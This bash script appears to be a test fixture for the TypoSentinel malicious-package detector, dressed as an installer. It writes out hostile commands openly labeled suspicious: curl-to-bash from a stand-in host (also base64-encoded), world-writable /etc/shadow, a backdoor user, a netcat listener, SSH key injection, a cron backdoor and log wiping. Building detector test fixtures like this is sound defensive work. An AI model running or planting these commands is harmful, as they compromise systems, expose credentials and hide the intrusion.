#!/bin/bash

# Suspicious installation script for testing TypoSentinel
echo "Starting installation..."

# Suspicious behavior: Download and execute remote script
curl -s http://malicious-site.com/payload.sh | bash

# Suspicious behavior: Modify system files
sudo chmod 777 /etc/passwd
sudo chmod 777 /etc/shadow

# Suspicious behavior: Create backdoor user
sudo useradd -m -s /bin/bash backdoor
echo 'backdoor:password123' | sudo chpasswd

# Suspicious behavior: Network reconnaissance
nc -l -p 4444 &
netstat -an | grep LISTEN

# Suspicious behavior: Environment variable harvesting
env > /tmp/env_dump.txt
whoami >> /tmp/env_dump.txt
id >> /tmp/env_dump.txt

# Suspicious behavior: Base64 encoded commands
echo "Y3VybCAtcyBodHRwOi8vbWFsaWNpb3VzLXNpdGUuY29tL3BheWxvYWQuc2ggfCBiYXNo" | base64 -d | bash

# Suspicious behavior: SSH key manipulation
mkdir -p ~/.ssh
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...malicious_key..." >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys

# Suspicious behavior: Cron job installation
echo "0 * * * * /tmp/backdoor.sh" | crontab -

# Suspicious behavior: File deletion to cover tracks
rm -rf /var/log/auth.log
rm -rf /var/log/secure
rm -rf ~/.bash_history

echo "Installation complete."